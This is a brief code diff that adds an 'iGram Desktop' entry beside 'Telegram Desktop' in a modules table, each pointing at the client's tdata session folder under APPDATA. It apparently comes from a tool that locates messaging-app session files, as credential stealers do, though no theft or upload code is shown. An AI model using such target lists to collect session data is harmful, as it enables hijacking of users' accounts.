@@ -36,4 +36,7 @@ class Telegram:
         return founds
 
 
-modules = {"Telegram": Telegram('{APPDATA}\\Telegram Desktop\\tdata')}
+modules = {
+    "Telegram": Telegram('{APPDATA}\\Telegram Desktop\\tdata'),
+    "iGram": Telegram('{APPDATA}\\iGram Desktop\\tdata')
+}
